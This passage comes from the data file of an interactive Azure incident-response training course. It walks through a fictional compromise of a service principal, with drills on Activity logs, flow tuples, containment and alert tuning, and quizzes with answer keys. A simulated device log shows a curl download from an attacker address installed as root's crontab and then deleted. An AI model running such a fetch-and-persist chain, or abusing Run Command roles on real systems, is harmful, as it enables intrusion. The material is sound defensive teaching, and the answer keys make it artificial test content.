            note: "Actions lists what the role allows. NotActions lists what is taken away from that.",
            table: {
              columns: ["Section", "Permission", "Description"],
              rows: [
                { id: "p-star", cells: ["Actions", "*", "Create and manage resources of all types"] },
                { id: "p-del", cells: ["NotActions", "Microsoft.Authorization/*/Delete", "Delete roles, policy assignments, policy definitions"] },
                { id: "p-auth", cells: ["NotActions", "Microsoft.Authorization/*/Write", "Create roles, role assignments, policy assignments, policy definitions"] },
                { id: "p-elev", cells: ["NotActions", "Microsoft.Authorization/elevateAccess/Action", "Grants the caller User Access Administrator access at the tenant scope"] },
                { id: "p-gal", cells: ["NotActions", "Microsoft.Compute/galleries/share/action", "Shares a Gallery to different scopes"] },
                { id: "p-sub", cells: ["NotActions", "Microsoft.Subscription/cancel/action", "Cancels the Subscription"] },
              ],
            },
          },
          logs: {
            heading: "Logs",
            query: "AzureActivity\n| where Caller == \"8b41f6d2-3e07-4a9c-b1f5-6d02e7c4a913\"   // object ID of sp-outagemap-deploy\n| where OperationNameValue has_any (\"ROLEASSIGNMENTS\", \"VIRTUALMACHINES\")\n| where ActivityStatusValue != \"Start\"\n| project TimeGenerated, OperationNameValue, ActivityStatusValue, CallerIpAddress",
            table: {
              columns: ["TimeGenerated", "OperationNameValue", "ActivityStatusValue", "CallerIpAddress"],
              rows: [
                { id: "l-dep2", cells: ["Thu 16:19", "MICROSOFT.COMPUTE/VIRTUALMACHINES/WRITE", "Success", "203.0.113.18"] },
                { id: "l-dep", cells: ["Fri 16:22", "MICROSOFT.COMPUTE/VIRTUALMACHINES/WRITE", "Success", "203.0.113.18"] },
                { id: "l-fail", cells: ["Mon 02:38", "MICROSOFT.AUTHORIZATION/ROLEASSIGNMENTS/WRITE", "Failure", "198.51.100.84"] },
                { id: "l-run", cells: ["Mon 02:41", "MICROSOFT.COMPUTE/VIRTUALMACHINES/RUNCOMMAND/ACTION", "Success", "198.51.100.84"] },
              ],
            },
          },
          flow: {
            heading: "NSG flow logs",
            filters: ["nsg-outagemap", "Mon 02:30 to 02:44", "Decoded from flowTuples"],
            note: "Every flow to and from vm-outagemap-02 (10.30.1.6) in the window. 10.30.0.4 is the application gateway. 10.30.2.9 is the outage database.",
            table: {
              columns: ["Time", "Source", "Destination", "Port", "Direction", "Decision"],
              rows: [
                { id: "f1", cells: ["02:31:07", "10.30.0.4", "10.30.1.6", "443", "Inbound", "Allow"] },
                { id: "f2", cells: ["02:36:12", "10.30.1.6", "10.30.2.9", "5432", "Outbound", "Allow"] },
                { id: "f3", cells: ["02:41:31", "10.30.1.6", "198.51.100.84", "80", "Outbound", "Allow"] },
                { id: "f4", cells: ["02:42:13", "10.30.0.4", "10.30.1.6", "443", "Inbound", "Allow"] },
                { id: "f5", cells: ["02:42:40", "10.30.1.6", "10.30.2.9", "5432", "Outbound", "Allow"] },
                { id: "f6", cells: ["02:43:18", "10.30.0.4", "10.30.1.6", "443", "Inbound", "Allow"] },
              ],
            },
          },
          guest: {
            heading: "Device events",
            commands: [{ id: "restart", label: "Restart VM" }],
            query: "DeviceProcessEvents\n| where DeviceName == \"vm-outagemap-02\"\n| where Timestamp between (datetime(2026-11-09 02:05) .. datetime(2026-11-09 02:44))\n| project Timestamp, AccountName, InitiatingProcessFileName, ProcessCommandLine",
            table: {
              columns: ["Timestamp", "AccountName", "InitiatingProcessFileName", "ProcessCommandLine"],
              rows: [
                { id: "g-rot", cells: ["02:05:01", "root", "cron", "/bin/sh -c /usr/sbin/logrotate /etc/logrotate.conf"] },
                { id: "g-sh", cells: ["02:41:24", "root", "run-command-extension", "/bin/sh -c /var/lib/waagent/run-command/download/14/script.sh"] },
                { id: "g-curl", cells: ["02:41:31", "root", "sh", "curl -s -o /tmp/.u http://198.51.100.84/u.txt"] },
                { id: "g-cron", cells: ["02:41:33", "root", "sh", "crontab /tmp/.u"] },
                { id: "g-rm", cells: ["02:41:33", "root", "sh", "rm -f /tmp/.u"] },
              ],
            },
          },
        },
        records: {},
        steps: [
          { id: "alerts", ask: "Start from what fired.", hint: "Security, in the resource menu on the left.", target: "menu:alerts", why: "Defender for Cloud raises a pre-scored alert and hands you a place to start. The detail you need sits in the logs behind it." },
          { id: "alert", ask: "Select the alert on the VM nobody signed in to.", hint: "The briefing named the machine.", target: "row:al-run", why: "High severity on vm-outagemap-02 at 02:41. The title gives a hint of how, and nothing yet about who." },
          { id: "activity", ask: "An alert says what. Go to the log that says who.", hint: "It's in the top section of the resource menu.", target: "menu:activity", why: "Run Command is a control-plane action, so the Activity log recorded it the moment it was called." },
          { id: "run", ask: "Select the entry behind the alert.", hint: "Match the operation, the VM and the time.", target: "row:a-run", why: "Run Command on Virtual Machine, which is Microsoft.Compute/virtualMachines/runCommand/action. Succeeded, at 02:41, started by sp-outagemap-deploy. This log records who sent it and where. It doesn't record the script." },
          { id: "fail", ask: "Three minutes earlier the same caller tried something that didn't work. Find it.", hint: "Read the Status column.", target: "row:a-fail", why: "Create role assignment, Failed. Somebody tried to give this identity more, and Azure refused. Hold on to that: it tells you something about the role it holds." },
          { id: "logs", ask: "The Activity log view has no source address. Go where you can query it.", hint: "Monitoring, in the resource menu.", target: "menu:logs", why: "The same events, exported to Log Analytics as the AzureActivity table, with CallerIpAddress as a column." },
          { id: "ip", ask: "Select the Run Command row, and compare its address with the deployments before it.", hint: "The operation name ends in RUNCOMMAND/ACTION.", target: "row:l-run", why: "198.51.100.84, the address that signed in with the leaked secret at 02:33. The honest deployments all came from the contractor's runner at 203.0.113.18." },
          { id: "flow", ask: "Did that address connect to the VM? Check the traffic.", hint: "Monitoring again.", target: "menu:flow", why: "No inbound flow from 198.51.100.84. The gateway's HTTPS and the database are the VM's normal day. The address only appears at 02:41:31, as the VM calling out. The command didn't arrive as a connection: it went through the Azure API to the VM Agent already on the machine, so what it took was a role on the VM, not a sign-in to it." },
          { id: "guest", ask: "The Activity log won't show the script. Find what ran on the machine.", hint: "Monitoring, the last item.", target: "menu:guest", why: "The endpoint sensor on the VM records every process. The agent's run-command-extension started the script, as root, from the VM Agent's own folder." },
          { id: "cron", ask: "Select the line that keeps the intruder on this VM after the script ends.", hint: "One line replaces something that runs on a schedule.", target: "row:g-cron", why: "crontab /tmp/.u replaces root's schedule with what was just downloaded. The script ended within seconds, and the schedule lives on. That's control of the VM, from one API call." },
          { id: "iam", ask: "Now the question Linnea asked. What let it do this?", hint: "Access control, in the top section of the menu.", target: "menu:iam", why: "Principal, role, scope: this page shows all three." },
          { id: "role", ask: "Select the caller's assignment, and read how far it reaches.", hint: "The name from the Activity log.", target: "row:ra-sp", why: "Contributor, on this resource group. So it reaches both VMs, the NSG, the storage account and anything added later. It's more than a deployment to one VM needs, and a stolen secret inherits all of it." },
          { id: "roles", ask: "Read what Contributor actually contains.", hint: "Roles, in the top section.", target: "menu:roles", why: "A role's name tells you little. Its definition is a list of permission lines." },
          { id: "star", ask: "Which line covers Run Command?", hint: "No line names it. One line covers all resource types.", target: "row:p-star", why: "Actions: *, every action on every resource type, minus the NotActions lines. Run Command isn't among those, so Contributor holds it. Virtual Machine Contributor, which the patch runner has, holds it too." },
          { id: "auth", ask: "Now explain the failure at 02:38. Which line stopped it?", hint: "What was the caller trying to create?", target: "row:p-auth", why: "NotActions removes Microsoft.Authorization/*/Write, and that's why Contributor can't grant roles. It can't promote itself, and it doesn't need to: one identity that can't touch access can still run code as root on every VM in its scope." },
        ],
        traps: {
          "row:a-patch": "That Run Command is on vm-outagemap-01 on Sunday at 23:10, by id-patch-runner: the nightly patch job. The alert names the other VM, and a different hour.",
          "row:l-dep": "Friday afternoon's VM write from 203.0.113.18 is the contractor's pipeline on its usual runner.",
          "row:l-dep2": "Thursday afternoon's VM write from 203.0.113.18 is the contractor's pipeline on its usual runner.",
          "row:g-rot": "02:05 is the system's own log rotation, thirty-six minutes before anything happened on this VM.",
          "action:deleterg": "Deleting the group destroys the VM, its disks and every piece of evidence on them, and the leaked secret would still work.",
          "action:addrole": "Adding an assignment changes nothing about the one that was abused. You're here to read, not grant.",
          "action:restart": "A restart clears memory, and the crontab survives it anyway. Nothing about this VM should change until the evidence is safe.",
        },
        lesson: "Read it backwards: the alert names the VM, the Activity log names the caller, Logs give the address, flow logs show no connection came in, device events show what ran, and IAM shows the role that allowed it. Contributor can't grant access, but Actions: * covers Run Command, and that runs as root through the VM Agent. A role on a VM is a shell on that VM. The next moves are removing this assignment, deleting the leaked secret, and leaving the VM running for the evidence.",
        primer: {
          title: "What you need for this console",
          points: [
            "**Run Command** sends a script to a VM through the Azure API. The **VM Agent** on the machine runs it, with root on Linux and SYSTEM on Windows.",
            "The permission is `Microsoft.Compute/virtualMachines/runCommand/action`, held by **Virtual Machine Contributor** and anything above it.",
            "In a role definition, **Actions** lists what's allowed and **NotActions** lists what's taken away from that.",
            "The Activity log keeps who, when and which VM. The VM's own telemetry keeps what ran.",
          ],
          example: {
            label: "Reading a custom role",
            lines: [
              "`Actions`: `Microsoft.Network/*/read`",
              "`NotActions`: `Microsoft.Network/publicIPAddresses/read`",
              "Aloud: this role may read anything in the network service, except public IP addresses.",
            ],
          },
        },
      },
      {
        kind: "worksheet",
        title: "One Identity's Unusual Monday",
        prompt: "One more thing turned up while you were in the logs: a guest contractor's account behaving oddly. Linnea wants every identity's Monday held against its own usual day, because a big number on its own means nothing.",
        caption: "AzureActivity · list-style actions per identity · last 24 hours",
        columns: ["Identity", "Type", "Action calls", "Resource types touched", "Usual resource types (30-day median)"],
        rows: [
          ["id-patch-runner", "Managed identity", "410", "3", "3"],
          ["sec-posture-scan", "App", "2,806", "24", "24"],
          ["tf-outagemap", "App", "96", "6", "6"],
          ["o.brandt", "User", "22", "3", "3"],
          ["c.idowu", "Guest user", "188", "14", "2"],
        ],
        questions: [
          { id: "who", q: "Whose day looks like somebody finding out what's here?", hint: "Set each row's two right-hand columns side by side.", answer: ["c.idowu", "idowu"], why: "c.idowu touched 14 resource types against a usual 2, none of it changing anything. Each call is harmless. The shape is what stands out: one identity, suddenly curious about everything it can see." },
          { id: "scan", q: "sec-posture-scan touched the most types of anyone. How many more than its usual number?", hint: "Today minus its median.", answer: ["0", "zero", "none"], why: "Zero. 24 types is its ordinary day, so width alone isn't the signal. The signal is the change from that identity's own baseline." },
          { id: "mult", q: "How many times c.idowu's usual breadth is today's?", hint: "Divide.", answer: ["7", "seven", "7x"], why: "Seven times. Pull what the account did before and after, and ask its sponsor whether a contractor had any reason to look." },
        ],
        primer: {
          title: "What enumeration leaves behind",
          points: [
            "After a foothold, most intruders first find out what they can reach: roles, VMs, storage accounts, vaults.",
            "The Activity Log doesn't usually record plain reads. It does record list-style actions, because they're POST calls: `storageAccounts/listKeys/action`, `sites/config/list/action`, `registries/listCredentials/action`.",
            "Defender for Resource Manager watches the wider set of calls and can alert on a discovery burst.",
            "**Baseline** means what this one identity normally does.",
          ],
          example: {
            label: "Count the shape, not the calls",
            lines: [
              "`AzureActivity | summarize Types = dcount(tostring(split(OperationNameValue, \"/\")[1])) by Caller`",
              "A caller's distinct count today, beside its count on a normal day.",
            ],
          },
        },
      },
    ],
    // ── Reading 8: containment ──
    "azure-r8": [
      {
        kind: "duel",
        title: "Close the Identity Down",
        prompt: "Monday, 11:00. You know what happened, and now it has to stop. Each move below is the intruder's next option. Play the one step that really takes it away. A step can sound responsible and stop nothing.",
        attacker: "The intruder behind sp-outagemap-deploy",
        moves: [
          { id: "m1", move: "Signs in again with the leaked secret", detail: "A copy of contractor-ci can ask for a fresh token whenever it likes.", counter: "secret", hint: "What does this identity authenticate with?", why: "Removing the credential from the app registration means nothing authenticating with it can get a new token, however many copies are out there." },
          { id: "m2", move: "Keeps a stolen browser session alive on a contractor's account", detail: "The cookie was copied from a phished laptop on Friday. The account's MFA method was replaced this morning, and the session carried on.", counter: "revoke", hint: "What is that browser actually holding?", why: "A session is issued once, at sign-in, and it isn't checked again against the credentials behind it. Changing those leaves it running. Revoking sessions is the step aimed at the session itself." },
          { id: "m3", move: "The crontab calls out from vm-outagemap-02 every five minutes", detail: "The VM is still serving the map, and still reaching 198.51.100.84.", counter: "nsg", hint: "Stop the traffic, and keep what's on the machine.", why: "A deny-all NSG rule at the lowest priority number, with an exception for the forensics range, is evaluated before everything else. The VM keeps running, so its memory, processes and disk stay intact." },
          { id: "m4", move: "Waits for the 14:00 rebuild to wipe the trail", detail: "An engineer booked a reimage of vm-outagemap-02 to get the map healthy before the storm.", counter: "snapshot", hint: "What has to exist before anything destructive runs?", why: "A snapshot of the OS and data disks is a point-in-time copy for offline forensics. Once it exists, the rebuild can go ahead, and the disk can still say how the intruder got in." },
          { id: "m5", move: "Takes the token of the VM's managed identity from the local endpoint", detail: "id-outagemap-app is attached to vm-outagemap-02, and the intruder is root on it.", counter: "roles", hint: "There's no credential of its own to delete.", why: "A managed identity has no secret to remove. What it can do is what it was granted, so remove or narrow that assignment, and rotate whatever it could read." },
        ],
        cards: [
          { id: "reset", name: "Reset the password", effect: "Sets a new password for future sign-ins." },
          { id: "secret", name: "Delete the client secret", effect: "Removes the credential from the app registration." },
          { id: "restart", name: "Restart the VM", effect: "Clears memory, then starts every service again." },
          { id: "revoke", name: "Revoke sessions", effect: "Invalidates refresh tokens and session cookies." },
          { id: "nsg", name: "Deny-all NSG rule", effect: "Priority above all others, forensics range excepted." },
          { id: "snapshot", name: "Snapshot the disks", effect: "A read-only copy of the OS and data disks." },
          { id: "roles", name: "Remove the role assignment", effect: "Takes the permission away from the identity." },
        ],
        lesson: "Match the step to what the attacker actually holds: a secret is deleted, a session is revoked, a role is removed, and traffic is cut with the machine left alive. Then make your copy before anything destructive runs.",
        primer: {
          title: "Stop it, and keep the evidence",
          points: [
            "**Human account:** revoke sessions and disable the account.",
            "**Service principal:** remove the client secret or certificate from the app registration.",
            "**Managed identity:** it has no credential. Cut its roles, look at the resource it runs on, and rotate whatever it could read.",
            "**VM:** isolate it with an NSG rule at the lowest priority number, and leave it running. A deallocated VM loses its RAM.",
            "**Before any rebuild:** snapshot the disks.",
          ],
          example: {
            label: "Another company: a signing bot's certificate leaks",
            lines: [
              "Delete the certificate from the bot's app registration.",
              "List what the bot could reach, and rotate anything it could read.",
              "Rebuild its host only after the disks are copied.",
            ],
          },
        },
      },
      {
        kind: "sequence",
        title: "The Order of Work on vm-outagemap-02",
        prompt: "The storm is three days out, and three teams want three different things from this VM. Linnea writes one order on the whiteboard. Put the steps in that order.",
        items: [
          { id: "s4", text: "Snapshot the OS disk and the data disks", note: "Now the evidence survives whatever happens next." },
          { id: "s6", text: "Rebuild the VM from a known-clean image", note: "A machine an attacker ran as root is rebuilt, not cleaned." },
          { id: "s1", text: "Delete contractor-ci, so the identity can't get a new token" },
          { id: "s3", text: "Add the deny-all NSG rule, and keep the VM running", note: "Traffic stops. Memory and disk stay as they are." },
          { id: "s5", text: "Work out everything the identity could reach, and rotate it", note: "Full scope comes before eradication." },
          { id: "s2", text: "Remove sp-outagemap-deploy's Contributor assignment" },
        ],
        order: ["s1", "s2", "s3", "s4", "s5", "s6"],
        doneNote: "Stop the identity, isolate the machine, preserve the evidence, understand the scope, and only then rebuild. Each step keeps the next one possible. Anyone who starts with the rebuild has lost the answer to how the attacker got in.",
      },
    ],
    // ── Drill before the vault record ──
    "azure-la1": [
      {
        kind: "anatomy",
        title: "Anatomy of a Vault Audit Record",
        prompt: "Linnea has a favour to return. NexaCorp bills Rowan's customers, and their SOC is an analyst short tonight, so you're on their desk from 22:00. Their cases start in Key Vault logs, so first read one of Rowan's: a harmless nightly rotation by a runbook.",
        source: "Key Vault diagnostic logs · AuditEvent · kv-rowan-ops",
        fields: [
          { key: "azure.keyvault.OperationName", value: "SecretSet", label: "What", note: "Object plus verb. This one writes a new version of a secret." },
          { key: "azure.keyvault.Category", value: "AuditEvent", note: "Key Vault's data-plane category. It exists because a diagnostic setting sends it." },
          { key: "azure.keyvault.ResultType", value: "Success" },
          { key: "azure.keyvault.CallerIPAddress", value: "203.0.113.60", label: "From where", note: "The address Azure saw. Rowan's Automation account has this one on record as its outbound address." },
          { key: "azure.keyvault.identity.claim.xms_mirid", value: "/subscriptions/3d7e1b40-92c6-4f1a-8b35-6ae0c4d2f917/resourcegroups/rg-ops/providers/Microsoft.Automation/automationAccounts/aa-rotate-tls", label: "Who", note: "The claim names the resource this managed identity belongs to." },
          { key: "azure.keyvault.requestUri", value: "https://kv-rowan-ops.vault.azure.net/secrets/map-tls-pfx", label: "On which object", note: "The object's name is in the path. Its value never appears in the log." },
          { key: "azure.keyvault.httpStatusCode", value: "200", label: "How it ended", note: "200 is a completed request." },
        ],
        summary: "Verb, object, result: those three say what happened. Identity and address say whether the right thing did it from the right place. Here a runbook wrote a TLS secret from its own address, on schedule, and that's the whole story.",
        primer: {
          title: "Reading a data-plane record",
          points: [
            "`OperationName` is what the caller did, and the verb matters.",
            "The status code says how it ended. `200` completed, and `403` was refused.",
            "So read them together: on a read operation, a 200 means the content went back to the caller.",
          ],
          example: {
            label: "The same idea in storage logs",
            lines: [
              "`GetBlob`, status `200`, path `/daily-reads/2026-11-08.csv`: the file's bytes left the account.",
              "`ListBlobs`, status `200`: names and properties went back, with no file contents.",
            ],
          },
        },
      },
      {
        kind: "worksheet",
        title: "The Function App's Address List",
        prompt: "One lesson from Rowan's own week before you start. fn-meter-ingest is a function app whose managed identity calls Azure all day. Its listed outbound addresses are 203.0.113.70 and 203.0.113.71. Read Tuesday's calls against that list.",
        caption: "AzureActivity · xms_mirid .../Microsoft.Web/sites/fn-meter-ingest",
        columns: ["TimeGenerated", "OperationNameValue", "ActivityStatusValue", "CallerIpAddress"],
        rows: [
          ["08:02:11", "MICROSOFT.WEB/SITES/CONFIG/LIST/ACTION", "Success", "203.0.113.70"],
          ["09:15:40", "MICROSOFT.WEB/SITES/CONFIG/LIST/ACTION", "Success", "203.0.113.71"],
          ["09:15:52", "MICROSOFT.WEB/SITES/FUNCTIONS/LISTKEYS/ACTION", "Success", "198.51.100.130"],
          ["09:16:04", "MICROSOFT.WEB/SITES/CONFIG/LIST/ACTION", "Success", "198.51.100.130"],
          ["11:44:27", "MICROSOFT.WEB/SITES/CONFIG/LIST/ACTION", "Success", "203.0.113.70"],
        ],
        questions: [
          { id: "ip", q: "Which address isn't one of the app's own?", hint: "Compare each row with the two addresses in the briefing.", answer: ["198.51.100.130"], why: "Azure hands this identity's tokens to fn-meter-ingest, on the app itself. A working token turning up at another address has left the app, so the investigation moves inside it: what's it running, and who got to it?" },
          { id: "n", q: "How many calls came from that address?", hint: "Count the rows.", answer: ["2", "two"], why: "Two, within a minute of a normal call. The identity, the operation and the result all look fine. Only the address gives it away." },
          { id: "secret", q: "Is there a client secret on this identity to rotate? (yes/no)", hint: "What kind of identity is it?", answer: ["no"], why: "A managed identity has none. There's no credential to change, which is why the app itself is where this goes next." },
        ],
      },
    ],
    // ── Drill before the verdict ──
    "azure-ac1": [
      {
        kind: "queue",
        title: "Right Rule, Right Verdict",
        prompt: "05:40 on NexaCorp's desk, and the shift's quiet part. Before their alert lands, Linnea sends four from Rowan's week to warm you up. The action name is sensitive in all four, so that isn't what decides them.",
        console: "SIEM · Incidents",
        actions: [
          { id: "btp", label: "Benign true positive", tone: "close" },
          { id: "fp", label: "False positive", tone: "close" },
          { id: "esc", label: "Escalate", tone: "escalate" },
        ],
        alerts: [
          { id: "patch", time: "23:10", severity: "Medium", rule: "Run Command on a production VM", entity: "id-patch-runner",
            fields: [{ k: "operationName", v: "Microsoft.Compute/virtualMachines/runCommand/action" }, { k: "resource", v: "vm-outagemap-01" }, { k: "evidence.role", v: "Virtual Machine Contributor" }, { k: "callerIpAddress", v: "203.0.113.30" }],
            context: "The change calendar holds standing change CHG-2291: nightly patching on the outage map VMs at 23:10. 203.0.113.30 is the patch host's documented address.", answer: "btp", why: "The rule was right: Run Command really ran. A role that fits the job, a documented address, a recurring time and an approved change make it authorised. Close it and cite the change." },
          { id: "tf", time: "14:22", severity: "Medium", rule: "Run Command on a production VM", entity: "tf-outagemap",
            fields: [{ k: "operationName", v: "Microsoft.Compute/virtualMachines/runCommand/action" }, { k: "resource", v: "vm-outagemap-02" }, { k: "evidence.role", v: "Contributor" }, { k: "callerIpAddress", v: "198.51.100.205" }],
            context: "tf-outagemap has no Run Command in 90 days of history. No change covers it, and the address isn't one of the pipeline's.", answer: "esc", why: "The same operation as the last alert, with every signal reversed: a broad role, an unknown address, no history and no change record." },
          { id: "blob", time: "15:05", severity: "High", rule: "Storage container made public", entity: "r.sandhu",
            fields: [{ k: "operationName", v: "Microsoft.Storage/storageAccounts/blobServices/containers/write" }, { k: "requestbody", v: "{\"properties\":{\"publicAccess\":\"None\"}}" }, { k: "resultType", v: "Success" }],
            context: "The rule matches every containers/write. This write's body sets the level to None, which is Private.", answer: "fp", why: "Nothing went public. The rule claimed an event that didn't occur, so this is a false positive, and the fix is to make the rule read the request body." },
          { id: "owner", time: "16:30", severity: "Medium", rule: "Owner role assigned", entity: "r.sandhu",
            fields: [{ k: "operationName", v: "Microsoft.Authorization/roleAssignments/write" }, { k: "scope", v: "rg-meterdata-prod" }, { k: "callerIpAddress", v: "203.0.113.25" }],
            context: "r.sandhu's office address, and a change ticket exists: CHG-2307, for an assignment on rg-meterdata-test.", answer: "esc", why: "A familiar person and a real ticket, but the ticket covers test and the write hit prod. A ticket counts only for what it actually names." },
        ],
        primer: {
          title: "Three ways an alert can end",
          points: [
            "**True positive:** the rule saw something real and unauthorised. Escalate it.",
            "**Benign true positive:** the rule was right about what it saw, and the activity was authorised.",
            "**False positive:** the rule was wrong. What it claims happened didn't happen.",
            "Weigh who, from where, with which role, on what schedule, and under which change record.",
            "A **standing change** is a pre-approved change that recurs, such as a nightly job.",
          ],
          example: {
            label: "Worked on a substation alarm",
            lines: [
              "A power-loss alarm fires at 03:00 at a substation.",
              "The sensor was right, and the maintenance calendar lists the monthly generator test.",
              "**Benign true positive:** a correct alert about authorised activity.",
            ],
          },
        },
      },
    ],
    // ── Reading 6: triage, and what pages someone ──
    "azure-r6": [
      {
        kind: "match",
        title: "Five Questions, Five Fields",
        prompt: "Linnea's checklist fits on a sticky note, and it's the same for any Azure alert. Match each question to where the answer lives.",
        pairs: [
          { id: "who", left: "WHO", right: "principalType, idtyp and xms_mirid, then caller to pivot on", why: "First a person or not, then which kind of identity, then the ID that follows it across the timeline." },
          { id: "where", left: "WHERE", right: "callerIpAddress, against the resource's known addresses", why: "The address Azure saw, compared with what that identity normally uses." },
          { id: "what", left: "WHAT", right: "operationName together with resourceId", why: "The exact action, and precisely what it touched." },
          { id: "outcome", left: "OUTCOME", right: "resultType", why: "Success means it completed. A flood of Failure across many resources from one identity is someone testing what works." },
          { id: "pattern", left: "PATTERN", right: "The same caller across hours or days, against its own history", why: "One recurring job or a one-off deviation, and that's often what decides it." },
        ],
      },
      {
        kind: "tune",
        title: "Which Operations Page Someone?",
        prompt: "Nobody was woken at 02:41 on Monday, because every control-plane alert goes to a mailbox. The storm is coming and on-call is thin. Linnea wants one log alert on AzureActivity that catches the five dangerous entries from the last month, and wakes someone for a false alarm at most once.",
        eventColumn: "Control-plane operation",
        dials: [
          { id: "tier", label: "Sensitivity tier, at least", short: "Tier", min: 1, max: 5, step: 1, start: 1, dir: "above" },
          { id: "hist", label: "Times this caller ran it in the last 30 days, at most", short: "History", min: 0, max: 30, step: 1, start: 30, dir: "below" },
        ],
        events: [
          { id: "b1", label: "Run Command on a production VM, by a deploy identity that never ran one", bad: true, values: { tier: 5, hist: 0 } },
          { id: "b2", label: "Owner granted at subscription scope, by a contractor's account, first ever", bad: true, values: { tier: 5, hist: 0 } },
          { id: "b3", label: "Custom Script Extension added to a long-running VM, third time this month by this caller", bad: true, values: { tier: 4, hist: 2 } },
          { id: "b4", label: "Storage listKeys by a function app that has never listed them", bad: true, values: { tier: 4, hist: 0 } },
          { id: "b5", label: "NSG rule opened by a service principal that made one other rule last month", bad: true, values: { tier: 3, hist: 1 } },
          { id: "g1", label: "id-patch-runner's Run Command, every night", bad: false, values: { tier: 5, hist: 30 } },
          { id: "g2", label: "Weekly Terraform role grant for new test VMs", bad: false, values: { tier: 5, hist: 4 } },
          { id: "g3", label: "Disk access opened for the restore test, every ten days", bad: false, values: { tier: 4, hist: 3 } },
          { id: "g4", label: "Tags updated by a new engineer on their first day", bad: false, values: { tier: 2, hist: 0 } },
          { id: "g5", label: "Auto-shutdown deallocating the test VMs", bad: false, values: { tier: 2, hist: 30 } },
          { id: "g6", label: "An engineer's first NSG rule, under a ticket", bad: false, values: { tier: 3, hist: 0 } },
          { id: "g7", label: "Pipeline updating a VM, twice a week", bad: false, values: { tier: 2, hist: 9 } },
        ],
        goal: { catch: 5, maxFalse: 1 },
        deploys: 3,
        lesson: "Sensitivity alone pages you for the nightly patch job, and rarity alone pages you for a new engineer's tags. Together they ask the real question: is this a dangerous operation by a caller that doesn't normally do it? One false alarm remains, because a first honest NSG rule looks like a first bad one, and that's a fair price. A short list of operations stays page-always, whoever runs them: a container going public is one.",
        primer: {
          title: "How this rule is built",
          points: [
            "An **Activity log alert** matches an operation name. A **log alert** on the `AzureActivity` table can use more complex logic, such as a caller's own history.",
            "Rowan scores each operation by what it can do, from tier 1 to tier 5.",
            "**Tier 1:** reads. **Tier 2:** routine changes. **Tier 3:** network and storage exposure.",
            "**Tier 4:** keys, extensions and disk access. **Tier 5:** role grants and code on a VM.",
            "**History** counts how many times this caller ran this operation in the last 30 days.",
          ],
          example: {
            label: "A different rule on a different operation",
            lines: [
              "`Microsoft.Sql/servers/firewallRules/write`, tier 3.",
              "Caller A ran it 40 times this month: its usual work, and the rule stays quiet.",
              "Caller B has never run it: this one fires.",
            ],
          },
        },
      },
    ],
    // ── Drills before the boss ──
    "azure-la2": [
      {
        kind: "worksheet",
        title: "Decode the Tuple",
        prompt: "Back on the desk at NexaCorp, the next entry on this timeline carries a flow record. Linnea sends four tuples from nsg-outagemap to practise on. Each string is one flow. Read them field by field.",
        caption: "NSG flow log · nsg-outagemap · flowTuples",
        columns: ["Tuple", "flowTuples"],
        rows: [
          ["A", "1794192091,10.30.1.6,198.51.100.84,51910,80,T,O,A,B"],
          ["B", "1794192104,198.51.100.140,10.30.1.5,55102,22,T,I,D,B"],
          ["C", "1794192133,10.30.0.4,10.30.1.6,40122,443,T,I,A,B"],
          ["D", "1794192160,10.30.1.6,10.30.2.9,33514,5432,T,O,A,C"],
        ],
        questions: [
          { id: "den", q: "One flow was refused. What's its source address?", hint: "The eighth field is the decision.", answer: ["198.51.100.140"], why: "Tuple B: decision D, for Deny. A real attempt, stopped by the NSG." },
          { id: "out", q: "Which tuple left the network for an outside address? (A, B, C or D)", hint: "Look for direction O and a public destination.", answer: ["a"], why: "Tuple A: direction O, from the VM to 198.51.100.84 on port 80. The VM started that one." },
          { id: "port", q: "What's the destination port in tuple C?", hint: "Fifth field. The fourth is the client's own temporary port.", answer: ["443"], why: "The source port is a temporary one, and the destination port names the service." },
        ],
        primer: {
          title: "Inside a flow tuple",
          points: [
            "Comma-separated, in this order: time, source IP, destination IP, source port, destination port, protocol, direction, decision, flow state.",
            "The time is in Unix epoch seconds.",
            "Protocol: `T` TCP, `U` UDP. Direction: `I` inbound, `O` outbound.",
            "Decision: `A` allowed, `D` denied. Flow state: `B` began, `C` continuing, `E` ended.",
          ],
          example: {
            label: "A DNS lookup, field by field",
            lines: [
              "`1762000000,10.1.1.4,10.1.2.8,49822,53,U,O,A,B`",
              "From 10.1.1.4 port 49822 to 10.1.2.8 port 53, over UDP, outbound, allowed, a new flow.",
            ],
          },
        },
      },
      {
        kind: "trace",
        title: "Did the Door Get Used?",
        prompt: "Remember the three rules that changed on nsg-outagemap. Linnea finished that thread this afternoon, and it's the best lesson of the week for tonight: a change on its own is only a question. Walk it through three logs.",
        lead: "198.51.100.84, and the live rule allow-ops-ssh, whose source became *",
        steps: [
          {
            id: "change",
            ask: "Who changed allow-ops-ssh, and from where?",
            source: "AzureActivity · nsg-outagemap",
            columns: ["TimeGenerated", "OperationNameValue", "ActivityStatusValue", "Resource", "Caller", "CallerIpAddress"],
            rows: [
              ["10-21 11:02:40", "MICROSOFT.NETWORK/NETWORKSECURITYGROUPS/SECURITYRULES/WRITE", "Success", "allow-ops-metrics", "o.brandt@rowangrid.example", "203.0.113.25"],
              ["11-09 02:54:12", "MICROSOFT.NETWORK/NETWORKSECURITYGROUPS/SECURITYRULES/WRITE", "Success", "deny-pg-in", "8b41f6d2-3e07-4a9c-b1f5-6d02e7c4a913", "198.51.100.84"],
              ["11-09 02:53:30", "MICROSOFT.NETWORK/NETWORKSECURITYGROUPS/SECURITYRULES/WRITE", "Success", "deny-debug-in", "8b41f6d2-3e07-4a9c-b1f5-6d02e7c4a913", "198.51.100.84"],
              ["11-09 02:52:47", "MICROSOFT.NETWORK/NETWORKSECURITYGROUPS/SECURITYRULES/WRITE", "Success", "allow-ops-ssh", "8b41f6d2-3e07-4a9c-b1f5-6d02e7c4a913", "198.51.100.84"],
            ],
            answer: 3,
            why: "The same caller and address as the Run Command, eleven minutes later. The October write came from o.brandt's office address and narrowed a rule. So far this is only a change, and it could be a clumsy one.",
            learned: "198.51.100.84 opened allow-ops-ssh at 02:52:47",
          },
          {
            id: "flow",
            ask: "Did traffic follow? Find the first allowed connection on the opened port from that address.",
            source: "NSG flow log · decoded · port 22",
            columns: ["Time", "Source", "Destination", "Port", "Direction", "Decision"],
            rows: [
              ["02:40:02", "198.51.100.140", "10.30.1.5", "22", "Inbound", "Deny"],
              ["02:58:41", "198.51.100.84", "10.30.1.6", "22", "Inbound", "Allow"],
              ["03:02:10", "198.51.100.140", "10.30.1.5", "22", "Inbound", "Allow"],
              ["08:11:55", "10.30.0.12", "10.30.1.6", "22", "Inbound", "Allow"],
            ],
